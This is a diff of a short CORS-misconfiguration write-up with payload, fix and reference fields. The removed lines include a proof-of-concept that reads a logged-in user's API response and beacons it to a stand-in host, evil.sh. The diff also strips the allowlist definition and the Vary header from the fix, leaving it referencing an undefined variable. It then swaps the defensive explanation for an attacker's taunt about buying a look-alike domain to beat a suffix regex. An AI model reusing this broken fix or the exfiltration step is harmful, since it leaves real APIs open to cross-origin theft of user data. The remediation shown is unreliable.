@@ -8,14 +8,10 @@ sink: |-
     Access-Control-Allow-Origin: <request Origin> + Allow-Credentials: true
 payload: |-
     fetch("https://api.example/me", { credentials: "include" })
-      .then((r) => r.text())
-      .then((me) => navigator.sendBeacon("//evil.sh", me))
 fix: |
-    const allowed = new Set(["https://app.example"]);
     if (allowed.has(origin)) res.setHeader("Access-Control-Allow-Origin", origin);
-    res.setHeader("Vary", "Origin");
 refs:
     - https://portswigger.net/web-security/cors
 ---
 
-Reflecting any `Origin` with credentials allowed lets every website read your API's responses as the logged-in user. Also watch for regexes like `/example\.com$/`, which matches `evilexample.com`, and for trusting the `null` origin, which sandboxed iframes send.
+You echo my origin with credentials allowed, so my site reads your API as the logged-in user. I also bought `evilexample.com` for your `/example\.com$/` regex.
